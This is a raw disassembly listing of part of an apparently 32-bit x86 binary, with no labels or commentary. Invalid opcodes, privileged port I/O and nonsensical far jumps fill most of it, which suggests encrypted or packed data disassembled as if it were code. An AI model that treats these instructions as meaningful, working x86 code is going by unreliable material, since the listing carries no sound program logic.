  401d3f:	loop   0x401cf7
  401d41:	lods   eax,DWORD PTR ds:[esi]
  401d42:	shr    DWORD PTR [ecx+ebx*8-0x1144851],cl
  401d49:	mov    edi,0xfffbfaf2
  401d4e:	out    dx,eax
  401d4f:	loope  0x401d4e
  401d51:	shl    esi,0xb
  401d54:	rcr    dl,cl
  401d56:	cli    
  401d57:	or     DWORD PTR [ebx],eax
  401d59:	in     al,dx
  401d5a:	fldz   
  401d5c:	add    eax,0xa4d1a8c7
  401d61:	(bad)  
  401d62:	mov    al,0xf7
  401d64:	mov    dl,0xca
  401d66:	mov    ch,0xbb
  401d68:	aad    0xc5
  401d6a:	lock jmp 0xc7f2:0xfcc3bbc3
  401d72:	add    bl,dl
  401d74:	retf   
  401d75:	fsubr  st,st(2)
  401d77:	jmp    0xd1fc:0xedc803e6
  401d7e:	enter  0xc2be,0xcd
  401d82:	leave  
  401d83:	jmp    0xb60a0e68
  401d88:	sti    
  401d89:	sar    dh,cl
  401d8b:	jmp    0x1f2:0xd9d3edc3
  401d92:	les    eax,FWORD PTR [edi]
  401d94:	xlat   BYTE PTR ds:[ebx]
  401d95:	shl    ebx,0xe9
  401d98:	ror    BYTE PTR [ebx],0x0
  401d9b:	out    0xec,eax
  401d9d:	mov    esi,0xbce4c7ec
  401da2:	(bad)
  401da5:	repnz leave 
  401da7:	aam    0xb5
  401da9:	sar    dh,1
  401dab:	hlt    
  401dac:	idiv   bl
  401dae:	cld    
  401daf:	ret    
  401db0:	cli    
  401db1:	loope  0x401d98
  401db3:	cld    
  401db4:	les    eax,FWORD PTR [edi]
  401db6:	(bad)  
  401db7:	in     al,0xda
  401db9:	cld    
  401dba:	stc    
  401dbb:	into   
  401dbc:	out    0xb9,al
  401dbe:	retf   
  401dbf:	shl    ebp,0xbc
  401dc2:	int    0xce
  401dc4:	(bad)  
  401dc5:	mov    dl,0xe4
  401dc7:	(bad)  
  401dc8:	jmp    0xefc3:0xd8e9ffd3
  401dcf:	loopne 0x401d89
  401dd1:	jecxz  0x401dd2
  401dd3:	out    0xd5,eax
  401dd5:	ror    DWORD PTR [edi],0x1
  401dd8:	loope  0x401dbd
  401dda:	add    al,0xec
  401ddc:	stc    
  401ddd:	loopne 0x401db6
  401ddf:	iret   
  401de0:	test   al,0xb1
  401de2:	rcl    esi,cl
  401de4:	stc    
  401de5:	mov    dl,0xf3
  401de7:	xlat   BYTE PTR ds:[ebx]
  401de8:	jmp    0xfcec:0xf4ead7f4
  401def:	add    ecx,esi
  401df1:	sar    BYTE PTR [edx+ebp*8-0xafb033e],cl
  401df8:	add    bl,ch
  401dfa:	clc    
  401dfb:	pop    es
  401dfc:	in     eax,dx
  401dfd:	fidivr WORD PTR [esi-0x1d422f33]
  401e03:	out    0xf7,eax
  401e05:	jmp    0xde070500
  401e0a:	fmul   st,st(0)
  401e0c:	loope  0x401dcd
  401e0e:	ret    
  401e0f:	xlat   BYTE PTR ds:[ebx]
  401e10:	mov    esp,0xe5e000c3
  401e15:	icebp  
  401e16:	add    ecx,DWORD PTR [ecx]
  401e18:	(bad)  
  401e19:	stc    
  401e1a:	or     eax,0xbda8f1e4
  401e1f:	lods   al,BYTE PTR ds:[esi]
  401e20:	in     al,0xf6
  401e22:	out    0xc2,al
  401e24:	in     eax,dx
  401e25:	out    0xce,al
  401e27:	retf   0xd8d6
  401e2a:	out    dx,eax
  401e2b:	mov    edi,0x6c8fbd9
  401e30:	(bad)  
  401e32:	fnstsw WORD PTR [ebp-0x23172109]
  401e38:	hlt    
  401e39:	loop   0x401e45
  401e3b:	jmp    0x401e21
  401e3d:	(bad)  
  401e3e:	in     eax,0xca
  401e40:	test   al,0xe3
  401e42:	sar    ebx,1
  401e44:	(bad)  
  401e45:	scas   eax,DWORD PTR es:[edi]
  401e46:	int    0xed
  401e48:	leave  
  401e49:	jmp    0x401e4a
  401e4b:	jmp    0x401e09
  401e4d:	cli    
  401e4e:	fcompp 
  401e50:	push   es
  401e51:	mov    cl,0xd8
  401e54:	sti    
  401e55:	out    0x2,al
  401e57:	fild   WORD PTR [esi+ecx*1]
  401e5a:	clc    
  401e5b:	add    al,BYTE PTR [edi]
  401e5d:	ret    0xe6a8
  401e60:	shl    al,1
  401e62:	scas   al,BYTE PTR es:[edi]
  401e63:	mov    al,0xea
  401e65:	mov    ch,0xcc
  401e67:	(bad)  
  401e69:	mov    ah,0xda
  401e6b:	ror    esp,1
  401e6d:	sar    BYTE PTR [esi+0x4e5fff2],1
  401e73:	fadd   QWORD PTR ds:0x70b0f01
  401e79:	jmp    0x401e7d
  401e7b:	in     al,0xc9
  401e7d:	jmp    0xe92cd03f
  401e82:	iret   
  401e83:	test   eax,0xcee9f1e0
  401e88:	mov    al,0xcb
  401e8a:	std    
  401e8b:	retf   0xd1f8
  401e8e:	(bad)  
  401e90:	push   es
  401e91:	out    0x5,eax
  401e93:	repz les eax,FWORD PTR [eax*8-0x14f8f509]
  401e9b:	paddsw mm4,mm7
  401e9e:	shl    DWORD PTR [ebx-0x3f321022],0xc6
  401ea5:	fnstenv [ecx-0xf443347]
  401eab:	mov    esi,0xd1c3f7c3
  401eb0:	mov    esi,0xb8d90604
  401eb5:	call   0xfa4c0da3
  401eba:	les    ecx,FWORD PTR [ecx]
  401ebc:	fsubr  st,st(0)
  401ebe:	stos   BYTE PTR es:[edi],al
  401ebf:	loope  0x401e93
  401ec1:	out    dx,eax
  401ec2:	xlat   BYTE PTR ds:[ebx]
  401ec3:	loop   0x401e9c
  401ec5:	mov    al,0xc5
  401ec7:	stc    
  401ec8:	jmp    0xe3172299
  401ecd:	int3   
  401ece:	fsubr  st,st(5)
  401ed0:	fsub   st,st(5)
  401ed2:	clc    
  401ed3:	jmp    0x401ee0
  401ed5:	loop   0x401eaf
  401ed7:	xlat   BYTE PTR ds:[ebx]
  401ed8:	(bad)  
  401ed9:	out    dx,eax
  401eda:	fmulp  st(6),st
  401edc:	add    DWORD PTR [edi-0xa5b0e1e],esp
  401ee2:	mov    ch,0xea
  401ee4:	cmc    
  401ee5:	div    BYTE PTR [ecx-0x1513362a]
  401eeb:	fdiv   st,st(0)
  401eed:	fiadd  DWORD PTR [ebx]
  401eef:	int3   
  401ef0:	(bad)  
  401ef1:	sti    
  401ef2:	(bad)  
  401ef3:	(bad)  
  401ef5:	jmp    0xe5092505
  401efa:	loope  0x401eff
  401efc:	stc    
  401efd:	mov    eax,0xf5cfefbf
  401f02:	into   
  401f03:	cli    
  401f04:	in     eax,dx
  401f05:	jmp    0xd932ece2
  401f0a:	fcmovne st,st(2)
  401f0c:	repnz jecxz 0x401ec7
  401f0f:	lock mov edi,0xe102e2de
  401f15:	neg    ecx
  401f17:	out    dx,al
  401f18:	dec    BYTE PTR [ebx]
  401f1a:	fmul   st,st(5)
  401f1c:	fcomp  st(6)
  401f1e:	repz ret 
  401f20:	(bad)  
  401f21:	fucom  st(4)
  401f23:	jmp    0x401eea
  401f25:	in     eax,dx
  401f26:	jmp    0xdc0aedf3
  401f2b:	in     eax,dx
  401f2c:	cmc    
  401f2d:	enter  0x1ec,0xd6
  401f31:	fcomp  st(5)
  401f33:	fnstsw WORD PTR [eax-0x27f5233d]
  401f39:	(bad)  
  401f3b:	push   es
  401f3c:	or     eax,0xf3ddb0f2
  401f41:	(bad)  [edx+edi*8-0x2b000d25]
  401f48:	sar    edi,cl
  401f4a:	(bad)  
  401f4c:	cmc    
  401f4d:	rol    cl,1
  401f4f:	out    0xfc,al
  401f51:	rol    BYTE PTR [eax],cl
  401f53:	idiv   BYTE PTR [edi+edi*4-0xfe0538]
  401f5a:	add    al,0xe4
  401f5c:	iret   
  401f5d:	mov    edi,0xb5f3cdde
  401f62:	mov    cl,0xc4
  401f64:	aad    0xf0
  401f66:	div    edx
  401f68:	in     eax,dx
  401f69:	fdivr  QWORD PTR [edi+ebp*8-0x3d2d0e0b]
  401f70:	add    ebp,esp
  401f72:	add    cl,bl
  401f74:	std    
  401f75:	push   es
  401f76:	fadd   QWORD PTR [edx+ebp*8]
  401f79:	ret    
  401f7a:	or     esp,ebx
  401f7c:	retf   0xe5c9
  401f7f:	xlat   BYTE PTR ds:[ebx]
  401f80:	icebp  
  401f81:	mov    esp,0xc6b5c1fb
  401f86:	cli    
  401f87:	out    0xdd,al
  401f89:	mov    eax,0x1dcdccd
  401f8e:	std    
  401f8f:	repz (bad) 
  401f92:	ret    0xd6e0
  401f95:	(bad)  
  401f96:	in     al,0x1
  401f98:	push   cs
  401f99:	cld    
  401f9a:	jmp    0x401faf
  401f9c:	fsubp  st(1),st
  401f9e:	in     al,0xf3
  401fa0:	in     eax,0xd7
  401fa2:	xlat   BYTE PTR ds:[ebx]
  401fa3:	rcl    cl,1
  401fa5:	in     al,dx
  401fa6:	cmc    
  401fa7:	jmp    0x401f62
  401fa9:	cld    
  401faa:	stc    
  401fab:	icebp  
  401fac:	div    dl
  401fae:	cld    
  401faf:	aad    0xc3
  401fb1:	out    0xf3,al
  401fb3:	in     al,0xe9
  401fb5:	mov    edi,0xdcedf7f5
  401fba:	hlt    
  401fbb:	(bad)
  401fbe:	(bad)  
  401fbf:	iret   
  401fc0:	scas   al,BYTE PTR es:[edi]
  401fc1:	mov    dh,0xea
  401fc3:	test   eax,0xe6eef5ac
  401fc8:	test   al,0xf5
  401fcb:	aad    0xc2
  401fcd:	add    esi,edi
  401fcf:	out    0xc2,al
  401fd1:	sti    
  401fd2:	shl    ah,0xfa
  401fd5:	ret    
  401fd6:	add    BYTE PTR [edi],al
  401fd8:	cld    
  401fd9:	std    
  401fda:	jmp    0x401fbd
  401fdc:	shrd   DWORD PTR [eax-0x24535335],esi,0xf0
  401fe4:	rol    edi,1
  401fe6:	rcl    dh,cl
  401fe8:	shr    eax,1
  401fea:	jmp    0x420dcab
  401fef:	icebp  
  401ff0:	(bad)  
  401ff1:	out    0xd2,eax
  401ff3:	shl    eax,cl
  401ff5:	add    ah,dl
  401ff7:	loop   0x401fcd
  401ff9:	stc    
  401ffa:	inc    ch
  401ffc:	cld    
  401ffd:	out    0xe0,al
  401fff:	out    dx,eax
  402000:	mov    esi,0xd2ebf4ce
  402005:	(bad)  
  402006:	(bad)  
  402007:	retf   0xdde4
  40200a:	retf   
  40200b:	jecxz  0x401fff
  40200d:	rcl    ebp,0xfd
  402010:	(bad)  
  402011:	clc    
  402012:	add    edi,DWORD PTR [esi+eax*8-0x1a061415]
  402019:	call   0xcf2d2f1c
  40201e:	loope  0x401fee
  402020:	jmp    0xe226d4dc
  402025:	jmp    0xfccb:0xd4eab4da
  40202c:	loope  0x402001
  40202e:	rcl    bl,cl
  402030:	ret    
  402031:	clc    
  402032:	jmp    0x40200f
  402034:	add    ah,dl
  402036:	or     al,cl
  402038:	cli    
  402039:	(bad)  
  40203b:	in     eax,dx
  40203c:	out    dx,eax
  40203d:	retf   
  40203e:	enter  0xcfca,0xf0
  402042:	rol    cl,cl
  402044:	int3   
  402045:	mov    ah,0xf6
  402047:	mov    ebx,0xf8faf6bb
  40204c:	mov    esp,0xccd401f7
  402051:	hlt    
  402052:	in     al,dx
  402053:	xlat   BYTE PTR ds:[ebx]
  402054:	cli    
  402055:	idiv   ebx
  402057:	std    
  402058:	stc    
  402059:	aad    0x7
  40205b:	fucomi st,st(2)
  40205d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40205e:	retf   0xa4f3
  402061:	repnz ror esi,1
  402064:	out    dx,al
  402065:	enter  0xccce,0xfa
  402069:	retf   
  40206a:	mov    esi,0xc2d4f6e9
  40206f:	shl    ch,cl
  402071:	rcl    ch,0xe1
  402074:	or     esi,ebx
  402076:	in     eax,0xc9
  402078:	std    
  402079:	(bad)  
  40207a:	cli    
  40207b:	fstp   st(0)
  40207d:	shr    DWORD PTR [edx-0x3c2b1852],cl
  402083:	aam    0xda
  402085:	mov    ecx,0xb7deb5e4
  40208a:	test   esi,0x3e0dcd2
  402090:	out    0xc1,eax
  402092:	idiv   bl
  402094:	fyl2xp1 
  402096:	(bad)  
  402097:	fcmovu st,st(1)
  402099:	fcmovu st,st(6)
  40209b:	or     BYTE PTR [eax+esi*8],al
  40209e:	jmp    0xf402e851
  4020a3:	retf   
  4020a4:	out    dx,al
  4020a5:	leave  
  4020a6:	icebp  
  4020a7:	mov    dh,0xac
  4020a9:	aad    0xd1
  4020ab:	std    
  4020ac:	mov    edx,0xf8f8b6cc
  4020b1:	xlat   BYTE PTR ds:[ebx]
  4020b2:	(bad)  
  4020b3:	not    ch
  4020b5:	aad    0xd8
  4020b7:	mov    ebp,0xdccbece5
  4020bc:	(bad)  
  4020be:	mov    cl,0xc2
  4020c0:	retf   
  4020c1:	(bad)  
  4020c2:	aad    0xe5
  4020c4:	mov    ah,0xc1
  4020c6:	call   0xc50c19c9
  4020cb:	aad    0xb9
  4020cd:	(bad)  
  4020cf:	mov    edi,0xddf702dd
  4020d4:	add    eax,0xc9bd02da
  4020d9:	dec    DWORD PTR ds:0xc6d0c9e0
  4020df:	test   al,0xb7
  4020e1:	lock xlat BYTE PTR ds:[ebx]
  4020e3:	icebp  
  4020e4:	(bad)  
  4020e5:	vpinsrw xmm5,xmm4,esp,0xc5
  4020ea:	hlt    
  4020eb:	call   0xce03e9cc
  4020f0:	ret    0xf9e7
  4020f3:	add    eax,0xe2e3cadf
  4020f8:	rol    dh,0x5
  4020fb:	fiadd  DWORD PTR [eax]
  4020fd:	mov    ecx,0xe3c2ede1
  402102:	out    0xfb,al
  402104:	leave  
  402105:	sar    DWORD PTR [ecx-0x1c05394b],1
  40210b:	hlt    
  40210c:	add    esi,esp
  40210e:	neg    dh
  402110:	test   al,0xe2
  402113:	test   edx,0xedfedc07
  402119:	aad    0xce
  40211b:	sti    
  40211c:	out    dx,eax
  40211d:	(bad)  
  40211f:	lods   al,BYTE PTR ds:[esi]
  402120:	cmc    
  402121:	out    0xd7,al
  402123:	lock mov ch,0xb9
  402126:	shr    ecx,cl
  402128:	mov    dh,0xc5
  40212a:	xlat   BYTE PTR ds:[ebx]
  40212b:	rol    BYTE PTR [ecx],cl
  40212d:	ret    0xc1be
  402130:	ret    
  402131:	inc    esp
  402133:	fdiv   st,st(7)
  402135:	jecxz  0x402115
  402137:	fmul   QWORD PTR [edi]
  402139:	clc    
  40213a:	prefetch (bad)
  40213b:	or     eax,0xf1dca7e4
  402140:	shr    dh,0xe0
  402143:	repnz mov ch,0xce
  402146:	mov    bh,0xff
  402148:	imul   bh
  40214a:	in     al,dx
  40214b:	mov    eax,0xe002d3fe
  402150:	sti    
  402151:	fld    QWORD PTR [edx]
  402153:	cmc    
  402154:	clc    
  402155:	(bad)  
  402157:	or     eax,ebx
  402159:	(bad)  
  40215a:	in     eax,0xef
  40215c:	in     eax,0xaf
  40215e:	ror    al,1
  402160:	test   al,0xca
  402162:	fucomi st,st(1)
  402164:	rol    ah,0xf7
  402167:	(bad)  
  402169:	repnz into 
  40216b:	std    
  40216c:	call   0xe238f273
  402171:	fcmovbe st,st(1)
  402173:	(bad)  
  402175:	lock fdivr st,st(3)
  402178:	fisttp QWORD PTR [esi]
  40217a:	or     DWORD PTR ds:0xb2f1f3e7,eax
  402180:	scas   eax,DWORD PTR es:[edi]
  402181:	out    dx,al
  402182:	mov    ch,0xd0
  402184:	lock (bad) 
  402186:	stc    
  402187:	rcl    dh,cl
  402189:	mov    ecx,0xcdd9cbbc
  40218e:	std    
  40218f:	fneni(8087 only) 
  402191:	mov    esi,0xdce0bdc1
  402196:	(bad)  
  402198:	fdivrp st(4),st
  40219a:	or     eax,0xc8a9d9c1
  40219f:	call   0xc70af977
  4021a4:	retf   
  4021a5:	jmp    0x402198
  4021a7:	aad    0xf5
  4021a9:	(bad)  
  4021aa:	sar    DWORD PTR [edi-0x260e4224],cl
  4021b0:	add    ah,dl
  4021b2:	icebp  
  4021b3:	mov    esp,0xf5f5d8f1
  4021b8:	out    0x0,al
  4021ba:	retf   
  4021bb:	fisttp DWORD PTR [ecx]
  4021bd:	loopne 0x4021ab
  4021bf:	mul    ch
  4021c1:	mov    bl,0xf2
  4021c3:	call   0xc92bf49b
  4021c8:	aad    0xe4
  4021ca:	stc    
  4021cb:	int    0xbb
  4021cd:	add    esp,ebx
  4021cf:	repz in al,dx
  4021d1:	int    0xf9
  4021d3:	rol    ch,1
  4021d5:	(bad)  
  4021d6:	or     ecx,DWORD PTR [esi]
  4021d8:	push   cs
  4021d9:	cmc    
  4021da:	fdivrp st(3),st
  4021dc:	in     eax,0xc7
  4021de:	int3   
  4021df:	iret   
  4021e0:	cmc    
  4021e1:	xlat   BYTE PTR ds:[ebx]
  4021e2:	enter  0xe5c7,0xb2
  4021e6:	mov    ch,0xad
  4021e8:	fcmovbe st,st(1)
  4021ea:	std    
  4021eb:	fcom   st(4)
  4021ed:	aad    0xfe
  4021ef:	out    0xd0,eax
  4021f1:	add    BYTE PTR [esi-0x251f081a],bh
  4021f7:	dec    DWORD PTR [edi]
  4021f9:	call   0xde25fdd9
  4021fe:	int    0xd7
  402200:	cmc    
  402201:	rcl    esi,0xed
  402204:	aam    0xd7
  402206:	into   
  402207:	mov    edi,0xeecec5d3
  40220c:	out    dx,eax
  40220d:	lock sti 
  40220f:	stc    
  402210:	jecxz  0x4021e5
  402212:	mov    edx,0xd4f900d2
  402217:	or     esi,esp
  402219:	or     al,0x8
  40221b:	in     al,0x7
  40221d:	(bad)  
  40221e:	mov    cl,0xb2
  402220:	in     eax,0xd3
  402222:	(bad)  
  402223:	bnd call 0xf017edf7
  402229:	hlt    
  40222a:	jecxz  0x402208
  40222c:	aad    0xee
  40222e:	icebp  
  40222f:	shl    edx,0xf4
  402232:	mov    ebp,0xe5d4c0f3
  402237:	out    dx,eax
  402238:	(bad)  
  40223a:	or     bh,cl
  40223c:	loopne 0x4021fc
  40223e:	ror    ebx,0xc1
  402241:	retf   0xd5d6
  402244:	aad    0xd2
  402246:	ror    esi,cl
  402248:	shl    al,cl
  40224a:	out    dx,al
  40224b:	add    ecx,eax
  40224d:	repz pop es
  40224f:	loop   0x40221e
  402251:	cmc    
  402252:	fcmovbe st,st(4)
  402254:	loop   0x402235
  402256:	loopne 0x402258
  402258:	stc    
  402259:	(bad)  
  40225a:	int    0xfd
  40225c:	or     cl,cl
  40225e:	mov    cl,0xbe
  402260:	repz in eax,dx
  402262:	repz aad 0xc7
  402265:	mov    bh,0xc7
  402267:	iret   
  402268:	(bad)
  40226b:	rcr    al,cl
  40226d:	icebp  
  40226e:	loopne 0x40225c
  402270:	ret    0xbcc7
  402273:	loop   0x402258
  402275:	neg    edi
  402277:	lds    ecx,FWORD PTR [eax]
  402279:	in     eax,0xcf
  40227b:	jmp    0x40227d
  40227d:	stos   DWORD PTR es:[edi],eax
  40227e:	mov    bl,0xcf
  402280:	loopne 0x402277
  402282:	not    ebp
  402284:	stc    
  402285:	lock mov dl,0xbf
  402288:	lock into 
  40228a:	out    dx,al
  40228b:	shr    bh,1
  40228d:	mov    esi,0xe5edefc3
  402292:	(bad)  
  402293:	sti    
  402294:	inc    edx
  402296:	or     bl,bh
  402298:	iret   
  402299:	hlt    
  40229a:	or     eax,0xb0c813fd
  40229f:	(bad)  
  4022a0:	scas   al,BYTE PTR es:[edi]
  4022a1:	into   
  4022a2:	ret    0xcff1
  4022a5:	xlat   BYTE PTR ds:[ebx]
  4022a6:	repz stc 
  4022a8:	imul   cl
  4022aa:	xlat   BYTE PTR ds:[ebx]
  4022ab:	mov    esp,0xe6fbbff0
  4022b0:	pop    es
  4022b1:	loopne 0x4022ac
  4022b3:	fdiv   st(0),st
  4022b5:	loope  0x40227e
  4022b7:	add    al,0xe0
  4022b9:	or     ecx,ebp
  4022bb:	femms  
  4022bd:	call   0xf8010c70
  4022c2:	out    dx,al
  4022c3:	loopne 0x40229c
  4022c5:	mov    dl,0xef
  4022c7:	out    dx,al
  4022c8:	mov    bh,0xbd
  4022ca:	mov    edi,0xbfc8f3db
  4022cf:	fcompp 
  4022d1:	stc    
  4022d2:	add    ebp,ebx
  4022d4:	sti    
  4022d5:	cli    
  4022d6:	fdiv   st(1),st
  4022d8:	stc    
  4022d9:	in     eax,dx
  4022da:	jmp    0xe2fd08e7
  4022df:	retf   0xd7f1
  4022e2:	hlt    
  4022e3:	jecxz  0x402299
  4022e5:	mov    ebx,0xd3b6eec8
  4022ea:	fdivrp st(1),st
  4022ec:	ret    0xf1bd
  4022ef:	mov    edi,0xe5fed4ed
  4022f4:	cmc    
  4022f5:	stc    
  4022f6:	or     ah,bl
  4022f8:	rcl    ch,0x9
  4022fb:	adc    ecx,esi
  4022fd:	ret    
  4022fe:	shl    ecx,0xf2
  402301:	(bad)  
  402302:	out    dx,al
  402303:	ror    ah,cl
  402305:	loopne 0x4022b7
  402307:	icebp  
  402308:	(bad)  
  402309:	aam    0xed
  40230b:	out    dx,al
  40230c:	rcr    bh,1
  40230e:	mov    esi,0xecdcdde3
  402313:	fsubrp st(6),st
  402315:	loopne 0x4022d8
  402317:	(bad)  
  402318:	aam    0x9
  40231a:	fisttp WORD PTR ds:0xedecb1f8
  402320:	int    0xb1
  402322:	rol    ecx,cl
  402324:	in     al,dx
  402325:	into   
  402326:	out    dx,al
  402327:	sar    ecx,cl
  402329:	repz sar edi,cl
  40232c:	(bad)  
  40232e:	mov    edx,0xe7d2fb03
  402333:	fdivp  st(2),st
  402335:	or     eax,ecx
  402337:	call   0xcb090e1d
  40233c:	or     edx,eax
  40233e:	fmul   st,st(1)
  402340:	lods   eax,DWORD PTR ds:[esi]
  402341:	lock mov dh,0xb2
  402344:	mov    ebx,0xfab6b2e5
  402349:	(bad)
  40234c:	sti    
  40234d:	call   0xd2422520
  402352:	mov    edx,0x1c2c0f3
  402357:	or     ah,ah
  402359:	retf   0xcac4
  40235c:	repnz scas eax,DWORD PTR es:[edi]
  40235e:	les    esi,FWORD PTR [edi-0x2413132f]
  402364:	retf   0xfff7
  402367:	jmp    0xbbea:0xbadffdd1
  40236e:	into   
  40236f:	bnd ret 
  402371:	pop    es
  402372:	add    esp,esp
  402374:	in     al,0xfb
  402376:	leave  
  402377:	loopne 0x402359
  402379:	aad    0xce
  40237b:	in     al,dx
  40237c:	in     al,0xc7
  40237e:	out    0xf1,al
  402380:	mov    ebp,0xd0d3e4dc
  402385:	in     al,0xc8
  402387:	jmp    0x3ea:0xeedbf6f1
  40238e:	mov    edx,0xe6dfd3e2
  402393:	repnz idiv bl
  402396:	fucomi st,st(0)
  402398:	loope  0x40238f
  40239a:	fsubp  st(0),st
  40239c:	loop   0x40238b
  40239e:	fst    st(2)
  4023a0:	enter  0xead0,0xd0
  4023a4:	(bad)  
  4023a5:	retf   
  4023a6:	jmp    0x402383
  4023a8:	jmp    0xd512ef65
  4023ad:	repz rcl ecx,cl
  4023b0:	loope  0x40238d
  4023b2:	fmulp  st(3),st
  4023b4:	fcmovnb st,st(3)
  4023b6:	retf   0xfbe9
  4023b9:	aad    0x1
  4023bb:	add    BYTE PTR [ecx],cl
  4023bd:	fsubr  st(5),st
  4023bf:	in     al,dx
  4023c0:	out    dx,eax
  4023c1:	out    dx,eax
  4023c2:	out    dx,al
  4023c3:	mov    ah,0xd2
  4023c5:	fcmovb st,st(7)
  4023c7:	(bad)  
  4023c8:	call   0xfc11d685
  4023cd:	mov    ebp,0xf5dde7c8
  4023d2:	sar    ecx,0xe1
  4023d5:	jmp    0x4023bd
  4023d7:	out    0x9,al
  4023d9:	leave  
  4023da:	(bad)  
  4023db:	retf   0xcc02
  4023de:	mov    ebp,0xb5e1a4f2
  4023e3:	lock int3 
  4023e5:	repnz out dx,eax
  4023e7:	in     al,dx
  4023e8:	sar    DWORD PTR [ebp+0x1bef4fc],cl
  4023ee:	out    dx,eax
  4023ef:	hlt    
  4023f0:	mov    ebp,0xd6f6f4da
  4023f5:	add    al,0xc1
  4023f7:	les    eax,FWORD PTR [esp+edx*8]
  4023fa:	fild   WORD PTR [ecx]
  4023fc:	(bad)  
  4023fd:	in     eax,dx
  4023fe:	out    dx,eax
  4023ff:	out    dx,eax
  402400:	int    0xb7
  402402:	fcmovnb st,st(4)
  402404:	lock iret 
  402406:	jmp    0xb3380ad7
  40240b:	sar    BYTE PTR [esi-0x272340fe],cl
  402411:	mov    ebx,0xc003d301
  402416:	xlat   BYTE PTR ds:[ebx]
  402417:	loopne 0x4023de
  402419:	(bad)
  40241c:	add    eax,ebp
  40241e:	leave  
  40241f:	mov    edi,0xa9b3c6f0
  402424:	(bad)  
  402425:	scas   eax,DWORD PTR es:[edi]
  402426:	in     eax,0xcd
  402428:	mov    ch,0xca
  40242a:	aad    0xdd
  40242c:	in     eax,dx
  40242d:	leave  
  40242e:	cli    
  40242f:	fucom  st(7)
  402431:	(bad)  
  402432:	out    0xb,eax
  402434:	mov    eax,0xd5dcc5d7
  402439:	call   0xc33de92c
  40243e:	fdiv   QWORD PTR [ecx-0x53171233]
  402444:	call   0xf615ee0e
  402449:	mov    ebx,0xdfe3f4cc
  40244e:	call   0x814f835
  402453:	(bad)  
  402455:	vpminsw ymm6,ymm1,ymm6
  402459:	jmp    0xe2ac:0xa8ede30c
  402460:	in     al,0xe3
  402462:	leave  
  402463:	icebp  
  402464:	lods   al,BYTE PTR ds:[esi]
  402465:	jmp    0x40243a
  402467:	fcomi  st,st(7)
  402469:	mov    ah,0xd6
  40246b:	iret   
  40246c:	iret   
  40246d:	aad    0xe2
  40246f:	mov    ecx,0xdef4db05
  402474:	fsub   st,st(6)
  402476:	shufps xmm4,xmm6,0xfe
  40247a:	int    0xfe
  40247c:	add    ah,ch
  40247e:	xlat   BYTE PTR ds:[ebx]
  40247f:	lods   eax,DWORD PTR ds:[esi]
  402480:	cmc    
  402481:	(bad)  
  402482:	loope  0x40246f
  402484:	in     al,dx
  402485:	call   0xd811f183
  40248a:	jmp    0xbdee:0xdedce2e9
  402491:	jecxz  0x402494
  402493:	shl    ebx,0xe2
  402496:	loopne 0x40247b
  402498:	mov    DWORD PTR [esi],0xdd0f0dca
  40249e:	(bad)  
  40249f:	jmp    0xc7e6:0xd2e1c3c6
  4024a6:	jmp    0x2e3:0xf5daeff7
  4024ad:	fnsave [esi-0x283c29fe]
  4024b3:	repnz neg dh
  4024b6:	fcomi  st,st(4)
  4024b8:	retf   
  4024b9:	loop   0x402489
  4024bb:	out    dx,eax
  4024bc:	sar    BYTE PTR [esi-0x431d1b0e],cl
  4024c2:	retf   
  4024c3:	aam    0xc9
  4024c5:	aam    0xec
  4024c7:	mov    dh,0xc4
  4024c9:	mov    ebx,0xd9c2b5ff
  4024ce:	ret    0xc7f4
  4024d1:	jecxz  0x4024bf
  4024d3:	out    0xcb,eax
  4024d5:	fadd   QWORD PTR [ecx]
  4024d7:	leave  
  4024d8:	(bad)  
  4024da:	loop   0x4024eb
  4024dc:	or     al,ah
  4024de:	(bad)
  4024e1:	(bad)  
  4024e2:	out    dx,al
  4024e3:	hlt    
  4024e4:	into   
  4024e5:	(bad)  
  4024e6:	sar    DWORD PTR [edx-0x43330554],cl
  4024ec:	mov    al,0xfe
  4024ee:	loope  0x4024f3
  4024f0:	mov    ah,0xda
  4024f2:	icebp  
  4024f3:	in     eax,0xd9
  4024f5:	add    al,0xfb
  4024f7:	iret   
  4024f8:	enter  0xf8e5,0xc5
  4024fc:	out    0xe0,eax
  4024fe:	test   eax,0xb3f4d2c9
  402503:	mov    esp,0xf8f0bad7
  402509:	call   0x23708f2
  40250e:	lock add dh,dl
  402511:	(bad)  
  402512:	in     eax,0xdc
  402514:	ror    BYTE PTR [edx],1
  402516:	(bad)  
  402518:	out    0xf4,al
  40251a:	fdiv   st(3),st
  40251c:	int    0xe9
  40251e:	in     al,0xd0
  402520:	lock test edx,0xccf1c2d3
  402527:	(bad)  
  402529:	in     al,dx
  40252a:	shl    edx,cl
  40252c:	stc    
  40252d:	iret   
  40252e:	(bad)  
  402530:	lock mov ebx,0xf5f0f4d7
  402536:	neg    dh
  402538:	or     dh,bh
  40253a:	ret    0xef03
  40253d:	rcr    dh,cl
  40253f:	lods   eax,DWORD PTR ds:[esi]
  402540:	aad    0xbd
  402542:	xlat   BYTE PTR ds:[ebx]
  402543:	loope  0x40250d
  402545:	(bad)  
  402547:	mov    edi,0xb5b9f4f1
  40254c:	add    DWORD PTR [edi+0x4dbf8d1],esi
  402552:	rcr    eax,cl
  402554:	jmp    0xd90f:0xf9e3dcf8
  40255b:	(bad)  
  40255d:	mov    edi,0xe0e1d7f0
  402562:	aad    0xe3
  402564:	out    dx,eax
  402565:	repnz out 0xe9,eax
  402568:	div    ah
  40256a:	mov    dl,0xce
  40256c:	into   
  40256d:	mov    ecx,0xcdb4fcde
  402572:	aam    0xc3
  402574:	aad    0xd5
  402576:	fucom  st(4)
  402578:	push   cs
  402579:	or     al,BYTE PTR [ecx]
  40257b:	or     al,0xd9
  40257d:	lock xlat BYTE PTR ds:[ebx]
  40257f:	in     al,0xf6
  402581:	ret    0xd7f3
  402584:	shl    ecx,1
  402586:	loopne 0x402579
  402588:	rcr    ebp,cl
  40258a:	out    dx,al
  40258b:	imul   dh
  40258d:	into   
  40258e:	add    ecx,esp
  402590:	repz in al,0xfd
  402593:	fucompp 
  402595:	(bad)  
  402597:	loopne 0x402562
  402599:	add    edx,esp
  40259b:	adc    ch,dl
  40259d:	lock repnz (bad) 
  4025a0:	fsubp  st(0),st
  4025a2:	not    dh
  4025a4:	shl    DWORD PTR [esi-0x4a2c104e],0xf7
  4025ab:	mov    esp,0x6c1c3ea
  4025b0:	aam    0xe4
  4025b2:	icebp  
  4025b3:	loope  0x40258d
  4025b5:	mov    edi,0xd5efe1c8
  4025ba:	out    0xde,al
  4025bc:	call   0xcc07028a
  4025c1:	mov    ch,0xdc
